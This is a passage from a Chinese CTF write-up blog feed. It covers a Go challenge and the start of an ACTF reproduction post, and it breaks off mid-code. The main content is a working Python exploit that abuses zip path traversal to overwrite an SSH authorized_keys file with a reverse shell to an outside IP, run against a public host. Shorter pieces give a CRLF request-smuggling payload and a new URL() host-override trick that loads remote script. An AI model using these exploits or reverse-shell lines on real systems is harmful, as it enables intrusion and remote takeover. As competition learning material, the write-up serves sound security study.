class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">func <span class="title function_">readfile</span><span class="params">(c *gin.Context)</span> &#123;</span><br><span class="line">filename := c.Query(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">file, err := os.Open(filename)</span><br><span class="line"><span class="keyword">if</span> err != nil &#123;</span><br><span class="line">fmt.Sprintln(<span class="string">&quot;Failed to open file&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">defer file.Close()</span><br><span class="line"><span class="comment">// 读取⽂件内容</span></span><br><span class="line">data := make([]<span class="type">byte</span>, <span class="number">1024</span>)</span><br><span class="line">count, err := file.Read(data)<span class="comment">//data读取的文件数据，并返回长度。</span></span><br><span class="line"><span class="keyword">if</span> err != nil &#123;</span><br><span class="line">c.String(http.StatusOK, <span class="string">&quot;Failed to read file&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出⽂件内容</span></span><br><span class="line">c.String(http.StatusOK, string(data[:count]))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag400 权限，没法直接读。</p><h2 id="file-unachive"><span id="file-unachive"> file-unachive</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">func <span class="title function_">fileUnarchiver</span><span class="params">(c *gin.Context)</span> &#123;</span><br><span class="line"><span class="comment">//接受并保存⽂件</span></span><br><span class="line">file, err := c.FormFile(<span class="string">&quot;file&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != nil &#123;</span><br><span class="line">c.JSON(http.StatusBadRequest, gin.H&#123;<span class="string">&quot;error&quot;</span>: err.Error()&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">filename := filepath.Base(file.Filename)</span><br><span class="line"><span class="comment">//将⽂件保存到服务器本地</span></span><br><span class="line"><span class="keyword">if</span> err := c.SaveUploadedFile(file, <span class="string">&quot;./&quot;</span>+filename); err != nil &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;error&quot;</span>: err.Error()&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">z := archiver.Zip&#123;</span><br><span class="line">MkdirAll:               <span class="literal">true</span>,</span><br><span class="line">SelectiveCompression:   <span class="literal">true</span>,</span><br><span class="line">ContinueOnError:        <span class="literal">false</span>,</span><br><span class="line">OverwriteExisting:      <span class="literal">true</span>,</span><br><span class="line">ImplicitTopLevelFolder: <span class="literal">false</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//解压⽂件到tmp⽬录,</span></span><br><span class="line">err = z.Unarchive(filename, <span class="string">&quot;/tmp&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != nil &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;error&quot;</span>: err.Error()&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//删除压缩包⽂件</span></span><br><span class="line">err = os.Remove(filename)</span><br><span class="line"><span class="keyword">if</span> err != nil &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;failed to delete file &#x27;%s&#x27;\n&quot;</span>, filename)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>该路由上传文件，，并会对上传的文件进行一个解压操作，解压到 tmp 下。</p><h2 id="admin-路由"><span id="admin-路由"> admin 路由</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">func <span class="title function_">admin</span><span class="params">(c *gin.Context)</span> &#123;</span><br><span class="line">key, err := ioutil.ReadFile(<span class="string">&quot;/home/vanzy/.ssh/id_rsa&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != nil &#123;</span><br><span class="line">panic(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Create signer from private key</span></span><br><span class="line">signer, err := ssh.ParsePrivateKey(key)</span><br><span class="line"><span class="keyword">if</span> err != nil &#123;</span><br><span class="line">panic(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// SSH server configuration</span></span><br><span class="line">config := &amp;ssh.ClientConfig&#123;</span><br><span class="line">User: <span class="string">&quot;vanzy&quot;</span>,</span><br><span class="line">Auth: []ssh.AuthMethod&#123;</span><br><span class="line">ssh.PublicKeys(signer),</span><br><span class="line">&#125;,</span><br><span class="line">HostKeyCallback: ssh.InsecureIgnoreHostKey(),</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Connect to SSH server</span></span><br><span class="line">conn, err := ssh.Dial(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;localhost:2221&quot;</span>, config)</span><br><span class="line"><span class="keyword">if</span> err != nil &#123;</span><br><span class="line">panic(err)</span><br><span class="line">&#125;</span><br><span class="line">defer conn.Close()</span><br><span class="line"><span class="comment">// Create a new SSH session</span></span><br><span class="line">session, err := conn.NewSession()</span><br><span class="line"><span class="keyword">if</span> err != nil &#123;</span><br><span class="line">panic(err)</span><br><span class="line">&#125;</span><br><span class="line">defer session.Close()</span><br><span class="line"><span class="comment">// Run a command on the SSH server</span></span><br><span class="line">out, err := session.Output(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != nil &#123;</span><br><span class="line">panic(err)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(string(out))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>于是想办法拿到密钥并进行覆盖</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> <span class="type">requests</span></span><br><span class="line"><span class="variable">pub</span> <span class="operator">=</span> requests.get(<span class="string">&#x27;http://localhost:8888/readfile?file=/home/vanzy/.ssh/id_rsa.pub&#x27;</span>).text</span><br><span class="line"><span class="title function_">print</span><span class="params">(pub)</span></span><br><span class="line">with <span class="title function_">open</span><span class="params">(<span class="string">&#x27;hh.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span> as f:</span><br><span class="line"> f.write(<span class="string">&#x27;command=&quot;bash -c \&#x27;bash -i &gt;&amp;/dev/tcp/43.143.192.19/1145 0&gt;&amp;1\&#x27;&quot; &#x27;</span> + pub)</span><br><span class="line"># the name of the zip file to <span class="type">generate</span></span><br><span class="line"><span class="variable">zf</span> <span class="operator">=</span> zipfile.ZipFile(<span class="string">&#x27;1.zip&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">url = <span class="string">&quot;http://localhost:8888/file-unarchiver&quot;</span></span><br><span class="line">fname = <span class="string">&#x27;hh.txt&#x27;</span></span><br><span class="line">#destination path of the file</span><br><span class="line">zf.write(fname, <span class="string">&#x27;../home/vanzy/.ssh/authorized_keys&#x27;</span>)</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>:<span class="string">&quot;1&quot;</span>,</span><br><span class="line">           <span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Accept&quot;</span>:<span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Accept-Encoding&quot;</span>:<span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/zip&quot;</span></span><br><span class="line">           &#125;</span><br><span class="line">cookies = &#123;<span class="string">&quot;XDEBUG_SESSION&quot;</span>:<span class="string">&quot;PHPSTORM&quot;</span>&#125;</span><br><span class="line">proxies = &#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;http://127.0.0.1:8080&quot;</span>,<span class="string">&quot;https&quot;</span>:<span class="string">&quot;http://127.0.0.1:8080&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&quot;1.zip&quot;</span>,open(<span class="string">&quot;1.zip&quot;</span>,<span class="string">&quot;rb&quot;</span>),<span class="string">&quot;application/zip&quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line">res2 = requests.post(url=url,data=files,headers=headers,cookies=cookies,proxies=proxies,files=files)</span><br></pre></td></tr></table></figure><p>一波文件上传，解压后目录穿越，覆盖 /home/vanzy/.ssh/authorized_keys<br> 整个流程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> <span class="type">requests</span></span><br><span class="line"><span class="variable">pub</span> <span class="operator">=</span> requests.get(<span class="string">&#x27;http://159.138.131.31:8888/readfile?file=/home/vanzy/.ssh/id_rsa.pub&#x27;</span>).text</span><br><span class="line"><span class="title function_">print</span><span class="params">(pub)</span></span><br><span class="line">with <span class="title function_">open</span><span class="params">(<span class="string">&#x27;hh.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span> as f:</span><br><span class="line"> f.write(<span class="string">&#x27;command=&quot;bash -c \&#x27;bash -i &gt;&amp;/dev/tcp/43.143.192.19/1145 0&gt;&amp;1\&#x27;&quot; &#x27;</span> + pub)</span><br><span class="line"># the name of the zip file to <span class="type">generate</span></span><br><span class="line"><span class="variable">zf</span> <span class="operator">=</span> zipfile.ZipFile(<span class="string">&#x27;1.zip&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">url = <span class="string">&quot;http://159.138.131.31:8888/file-unarchiver&quot;</span></span><br><span class="line">fname = <span class="string">&#x27;hh.txt&#x27;</span></span><br><span class="line">#destination path of the file</span><br><span class="line">zf.write(fname, <span class="string">&#x27;../home/vanzy/.ssh/authorized_keys&#x27;</span>)</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>:<span class="string">&quot;1&quot;</span>,</span><br><span class="line">           <span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Accept&quot;</span>:<span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Accept-Encoding&quot;</span>:<span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/zip&quot;</span></span><br><span class="line">           &#125;</span><br><span class="line">cookies = &#123;<span class="string">&quot;XDEBUG_SESSION&quot;</span>:<span class="string">&quot;PHPSTORM&quot;</span>&#125;</span><br><span class="line">proxies = &#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;http://127.0.0.1:8080&quot;</span>,<span class="string">&quot;https&quot;</span>:<span class="string">&quot;http://127.0.0.1:8080&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&quot;1.zip&quot;</span>,open(<span class="string">&quot;1.zip&quot;</span>,<span class="string">&quot;rb&quot;</span>),<span class="string">&quot;application/zip&quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line">res2 = requests.post(url=url,data=files,headers=headers,cookies=cookies,proxies=proxies,files=files)</span><br><span class="line">requests.get(url=<span class="string">&quot;http://159.138.131.31:8888/admin&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="easychek1n"><span id="easychek1n"> easyChek1n</span></h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /<span class="number">2023</span>/%20HTTP/<span class="number">1.1</span>%<span class="number">0d</span>%0aHost:%<span class="number">20127.0</span><span class="number">.0</span><span class="number">.1</span>%<span class="number">0d</span>%0a%<span class="number">0d</span>%0aGET%<span class="number">20</span>/<span class="number">2022.</span>php%3furl%3d43<span class="number">.143</span><span class="number">.192</span><span class="number">.19</span>%3a1145/%3fb%<span class="number">3d</span> HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">115.239</span><span class="number">.215</span><span class="number">.75</span>:<span class="number">8082</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">112.0</span><span class="number">.0</span><span class="number">.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9,ja;q=0.8</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="WP" scheme="https://1llustrious.github.io/tags/WP/"/>
    
    <category term="CTF" scheme="https://1llustrious.github.io/tags/CTF/"/>
    
    <category term="复现" scheme="https://1llustrious.github.io/tags/%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>ACTF-复现</title>
    <link href="https://1llustrious.github.io/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/"/>
    <id>https://1llustrious.github.io/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-12-02T00:12:41.000Z</published>
    <updated>2023-12-02T11:42:25.754Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- toc --><ul><li><a href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2">写在前面</a></li><li><a href="#easy-latex">easy latex</a><ul><li><a href="#new-url%E7%89%B9%E6%80%A7">new URL 特性😂</a><ul><li><a href="#%E8%BF%90%E7%94%A8%E5%88%B0%E9%A2%98%E7%9B%AE">运用到题目🤪</a></li></ul></li><li><a href="#visit%E8%A7%A6%E5%8F%91">visit 触发</a></li></ul></li><li><a href="#hooks">hooks</a><ul><li><a href="#what-is-webhook">what is webhook🤔</a></li><li><a href="#abusing-jenkins-login">Abusing Jenkins login</a></li><li><a href="#%E5%BC%80%E6%89%93">开打😤</a></li></ul></li><li><a href="#~ave-mujicas-masquerade~">~Ave Mujica’s Masquerade~</a><ul><li><a href="#%E6%BA%90%E7%A0%81%E5%86%B2">源码，冲😓</a></li></ul></li><li><a href="#story">story</a><ul><li><a href="#%E6%BA%90%E7%A0%81">源码🤔</a></li></ul></li></ul><!-- tocstop --><h1 id="写在前面"><span id="写在前面"> 写在前面</span></h1><p>呜呜呜，shanhegiegie 太猛了，打了一天懒猫，第二天还要上课，周六补课，是谁啊，原来是👴啊，那没事了 (nmsl).</p><p>参考:</p><p><a href="https://wm-ctf-team.feishu.cn/docx/PLbbdhwdyoAefuxokXwcYppzn1c">https://wm-ctf-team.feishu.cn/docx/PLbbdhwdyoAefuxokXwcYppzn1c</a></p><p><a href="https://mp.weixin.qq.com/s/pzXApXq3LhZvZvc87qqMDw">微信公众平台 (qq.com)</a></p><h1 id="easy-latex"><span id="easy-latex"> easy latex</span></h1><h2 id="new-url-特性"><span id="new-url-特性"> new URL 特性😂</span></h2><p>先来个小 demo</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> username = <span class="string">&quot;43.143.192.19:1145&quot;</span></span><br><span class="line"><span class="keyword">const</span> vip_url = <span class="string">&quot;http://vip:5000/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span> <span class="title function_">URL</span>(username,vip_url))</span><br></pre></td></tr></table></figure><p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231030151912.png" alt="微信截图_20231030151912"></p><p>如此，pathname 是我们的第一个参数，host 是我们的第二个参数.</p><p>倘若我第一个参数前面加 \\ 或是 //, 阁下又当如何应对😓.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> username = <span class="string">&quot;\\\\43.143.192.19:1145&quot;</span></span><br><span class="line"><span class="comment">//const username = &quot;//43.143.192.19:1145&quot;</span></span><br><span class="line"><span class="keyword">const</span> vip_url = <span class="string">&quot;http://vip:5000/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span> <span class="title function_">URL</span>(username,vip_url))</span><br></pre></td></tr></table></figure><p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231030152151.png" alt="微信截图_20231030152151"></p><p>喜欢我绕过污染 host 吗😛</p><h3 id="运用到题目"><span id="运用到题目"> 运用到题目🤪</span></h3><p>不多 bb, 源码鉴赏一波</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/preview&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; tex, theme &#125; = req.<span class="property">query</span></span><br><span class="line">    <span class="keyword">if</span> (!tex) &#123;</span><br><span class="line">        tex = <span class="string">&#x27;Today is \\today.&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> nonce = <span class="title function_">getNonce</span>(<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">let</span> base = <span class="string">&#x27;https://cdn.jsdelivr.net/npm/latex.js/dist/&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> (theme) &#123;</span><br><span class="line">        base = <span class="keyword">new</span> <span class="title function_">URL</span>(theme, <span class="string">`http://<span class="subst">$&#123;req.headers.host&#125;</span>/theme/`</span>) + <span class="string">&#x27;/&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;preview.html&#x27;</span>, &#123; tex, nonce, base &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>我直接 theme 上放入我的 vps, 远程加载奥西给</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preview?tex=asd&amp;theme=<span class="comment">//43.143.192.19:1145</span></span><br></pre></td></tr></table></figure><p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231030173612.png" alt="微信截图_20231030173612"></p><p>经一格德拉米的测试😤,wcsndm, 就算啥路径都不加他都会访问 /js/base.js, 这很不自由🤔.</p><p>没关系，直接在 vps 起一个一模一样的 emoji,👴真是个天才.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="string">&#x27;wcsndm&#x27;</span>);</span><br></pre></td></tr></table></figure><p>/var/www/html/base/base.js 放上这个代码，测试一波，让我狠狠地测！！！🥵</p><p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231030175131.png" alt="微信截图_20231030175131"></p><p>欧内的手，好汉，奥西给，爽的雅痞，比🐍出来还爽.</p><h2 id="visit-触发"><span id="visit-触发"> visit 触发</span></h2><p>不多 bb, 上源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/share/:id&#x27;</span>, reportLimiter, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; id &#125; = req.<span class="property">params</span></span><br><span class="line">    <span class="keyword">if</span> (!id) &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;no note id specified&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> url = <span class="string">`http://localhost:<span class="subst">$&#123;PORT&#125;</span>/note/<span class="subst">$&#123;id&#125;</span>`</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">visit</span>(url)</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;done&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e)</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;something error&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">visit</span> = <span class="keyword">async</span> (<span class="params">url</span>) =&gt; &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`start: <span class="subst">$&#123;url&#125;</span>`</span>)</span><br><span class="line">    <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>(&#123;</span><br><span class="line">        <span class="attr">headless</span>: <span class="string">&#x27;new&#x27;</span>,</span><br><span class="line">        <span class="attr">executablePath</span>: <span class="string">&#x27;/usr/bin/google-chrome-stable&#x27;</span>,</span><br><span class="line">        <span class="attr">args</span>: [<span class="string">&#x27;--no-sandbox&#x27;</span>],</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> ctx = <span class="keyword">await</span> browser.<span class="title function_">createIncognitoBrowserContext</span>();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">const</span> page = <span class="keyword">await</span> ctx.<span class="title function_">newPage</span>();</span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">setCookie</span>(&#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">            <span class="attr">value</span>: <span class="variable constant_">FLAG</span>,</span><br><span class="line">            <span class="attr">domain</span>: <span class="string">`<span class="subst">$&#123;APP_HOST&#125;</span>:<span class="subst">$&#123;APP_PORT&#125;</span>`</span>,</span><br><span class="line">            <span class="attr">httpOnly</span>: <span class="literal">true</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">goto</span>(url, &#123;<span class="attr">timeout</span>: <span class="number">5000</span>&#125;)</span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">3000</span>)</span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">close</span>()</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> ctx.<span class="title function_">close</span>();</span><br><span class="line">    <span class="keyword">await</span> browser.<span class="title function_">close</span>()</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`done: <span class="subst">$&#123;url&#125;</span>`</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么众所周知，visit 就是能够自行打开浏览器并且访问，不知道的话上网查，别问👴.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/vip&#x27;</span>, auth, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> username = req.<span class="property">session</span>.<span class="property">username</span></span><br><span class="line">    <span 